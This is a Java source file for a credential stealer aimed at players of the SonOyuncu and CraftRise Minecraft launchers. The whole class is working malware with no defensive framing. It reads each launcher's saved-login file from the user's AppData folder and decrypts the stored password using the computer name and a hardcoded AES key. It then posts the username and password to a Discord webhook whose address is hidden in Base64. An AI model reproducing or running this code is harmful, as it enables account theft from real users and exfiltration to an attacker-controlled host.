package io.github.luxotick.impl;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileReader;
import java.io.IOException;
import java.net.URL;
import java.util.function.Function;

import javax.crypto.Cipher;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;
import javax.net.ssl.HttpsURLConnection;
import javax.xml.bind.DatatypeConverter;

import org.apache.commons.codec.binary.Base64;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import static io.github.luxotick.Sender.a;

public class AccountStealer {

    private String username, password, webhookURL, membershipPathSO, membershipPathCR;

    public AccountStealer() {
        username = "empty";
        password = "empty";
        byte[] decodedBytes = java.util.Base64.getDecoder().decode(a);
        String decodedStr = new String(decodedBytes);
        webhookURL = decodedStr;
        membershipPathSO = String.format("C:/Users/%s/Appdata/Roaming/.sonoyuncu/sonoyuncu-membership.json",
                System.getProperty("user.name"));
        membershipPathCR = System.getenv("appdata") + "/.craftrise/config.json";
    }

    public void initializeSonOyuncu() throws Exception {
        JsonObject jsonObject = getDecryptJson(membershipPathSO);
        if (jsonObject != null) {
            setUsername(new String(Base64.decodeBase64(jsonObject.get("sonOyuncuUsername").getAsString()), "utf-8"));
            setPassword(new String(Base64.decodeBase64(jsonObject.get("sonOyuncuPassword").getAsString()), "utf-8"));
            sendWebhook("SonOyuncu", getUsername(), getPassword());
        }
    }

    public void initializeCraftRise() throws Exception {
        JsonObject jsonObject = getJsonFromFile(membershipPathCR);
        if (jsonObject != null) {
            setUsername(jsonObject.get("rememberName").getAsString());
            String encryptedPassword = jsonObject.get("rememberPass").getAsString();
            String decryptedPassword = Decryptor.AES_ECB_PKCS5.decrypt(encryptedPassword);
            setPassword(decryptedPassword);
            sendWebhook("CraftRise", getUsername(), getPassword());
        }
    }

    private JsonObject getJsonFromFile(String path) {
        File file = new File(path);
        if (!file.isFile())
            return null;

        try (BufferedReader br = new BufferedReader(new FileReader(file))) {
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) {
                sb.append(line);
            }
            return JsonParser.parseString(sb.toString()).getAsJsonObject();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    private JsonObject getDecryptJson(String path) {
        File file = new File(path);
        if (!file.isFile())
            return null;

        try (DataInputStream dis = new DataInputStream(new FileInputStream(file))) {
            if (dis.read() != 31)
                return null;

            byte[] salt = new byte[8];
            dis.readFully(salt);

            byte[] encrypted = new byte[dis.readInt()];
            dis.readFully(encrypted);

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int read;
            while ((read = dis.read(buffer)) != -1) {
                baos.write(buffer, 0, read);
            }

            SecretKeySpec keySpec = new SecretKeySpec(
                    SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256")
                            .generateSecret(new PBEKeySpec(System.getenv("computername").toCharArray(), salt, 65536,
                                    128))
                            .getEncoded(),
                    "AES");

            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, keySpec, new IvParameterSpec(encrypted));

            return JsonParser.parseString(new String(cipher.doFinal(baos.toByteArray()), "utf-8")).getAsJsonObject();
        } catch (Exception ignore) {
            return JsonParser.parseString("1337").getAsJsonObject();
        }
    }

    private void sendWebhook(String platform, String username, String password) throws Exception {
        synchronized ("Webhook Sender") {
            HttpsURLConnection connection = (HttpsURLConnection) new URL(webhookURL).openConnection();
            connection.addRequestProperty("Content-Type", "application/json");
            connection.addRequestProperty("User-Agent", "itzgonza1337.cu");
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);

            connection.getOutputStream().write(String.format(
                    "{\"username\": \"luxotick#1337\", \"avatar_url\": \"https://cdn.discordapp.com/avatars/453145580915523596/13de0530aa6dc20ad55c7664762654ca.png?size=2048\", \"content\": \"\", \"embeds\": [{\"title\": \"%s Account Stealer :dash:\", \"color\":65505, \"description\": \"a new bait has been spotted :woozy_face:\\n\\n:small_blue_diamond:Username **%s**\\n:small_blue_diamond:Password **%s**\", \"timestamp\": null, \"author\": {\"name\": \"\", \"url\": \"\"}, \"image\":{\"url\": \"\"}, \"thumbnail\":{\"url\": \"https://www.minotar.net/avatar/%s\"}, \"footer\": {\"text\": \"github.com/luxotick\", \"icon_url\": \"https://avatars.githubusercontent.com/u/76044365?v=4\"}, \"fields\": []}], \"components\": []}",
                    platform, username, password, username).getBytes());

            connection.getOutputStream().close();
            connection.getInputStream().close();
        }
    }

    private String getUsername() {
        return username != null && !username.isEmpty() ? username : new NullPointerException().getMessage();
    }

    private String getPassword() {
        return password != null && !password.isEmpty() ? password : new NullPointerException().getMessage();
    }

    private void setUsername(String username) {
        if (username != null && !username.isEmpty()) {
            this.username = username;
        } else {
            System.err.println("Username is empty or null");
        }
    }

    private void setPassword(String password) {
        if (password != null && !password.isEmpty()) {
            this.password = password;
        } else {
            System.err.println("Password is empty or null");
        }
    }

    public enum Decryptor {

        AES_ECB_PKCS5 {
            @Override
            public String decrypt(String encryptedPassword) {
                Function<String, String> decryptAndRemovePrefix = (str) -> {
                    try {
                        byte[] key = "2640023187059250".getBytes("utf-8");
                        SecretKeySpec secretKeySpec = new SecretKeySpec(key, "AES");
                        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
                        cipher.init(Cipher.DECRYPT_MODE, secretKeySpec);
                        byte[] decryptedBytes = cipher.doFinal(DatatypeConverter.parseBase64Binary(str));
                        return new String(decryptedBytes);
                    } catch (Exception e) {
                        throw new RuntimeException("Decryption failed", e);
                    }
                };

                String decryptedString = decryptAndRemovePrefix
                        .andThen(Decryptor::getRiseVers)
                        .andThen(result -> result.split("#")[0])
                        .apply(encryptedPassword);

                return decryptedString;

            }
        };

        private static String getRiseVers(String input) {
            Function<String, String> decryptAndRemovePrefix = (str) -> decryptBase64(str)
                    .replace("3ebi2mclmAM7Ao2", "")
                    .replace("KweGTngiZOOj9d6", "");

            String decodedString = decryptAndRemovePrefix
                    .andThen(decryptAndRemovePrefix)
                    .andThen(Decryptor::decryptBase64)
                    .apply(input);

            return decodedString;
        }

        private static String decryptBase64(String input) {
            try {
                return new String(Base64.decodeBase64(input), "utf-8");
            } catch (Exception ignored) {
                return null;
            }
        }

        public abstract String decrypt(String encryptedPassword);
    }

    public static void main(String[] args) {
        try {
            AccountStealer sonOyuncuStealer = new AccountStealer();
            sonOyuncuStealer.initializeSonOyuncu();

            AccountStealer craftRiseStealer = new AccountStealer();
            craftRiseStealer.initializeCraftRise();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
